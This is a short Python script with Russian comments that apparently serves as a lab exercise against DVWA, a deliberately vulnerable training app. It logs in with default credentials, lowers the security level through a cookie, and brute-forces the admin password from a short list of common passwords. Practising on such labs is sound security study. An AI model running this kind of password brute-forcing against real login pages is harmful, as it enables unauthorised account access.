import requests

base_url = "http://dvwa.local"
login_url = base_url + "/login.php"
brute_url = base_url + "/vulnerabilities/brute/"

session = requests.Session()

#  Логинимся в DVWA
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}

session.post(login_url, data=login_data)

#  Принудительно ставим уровень безопасности LOW
session.cookies.set("security", "low")

print("[+] Cookies после логина:")
for c in session.cookies:
    print(f"    {c.name} = {c.value}")

#  Bruteforce
username = "admin"
passwords = [
    "123456",
    "qwerty",
    "admin",
    "password",
    "letmein"
]

for password in passwords:
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    r = session.get(brute_url, params=params)

    if "Welcome to the password protected area" in r.text:
        print(f"\n[+] ПАРОЛЬ НАЙДЕН: {password}")
        break
    else:
        print(f"[-] Неверный пароль: {password}")

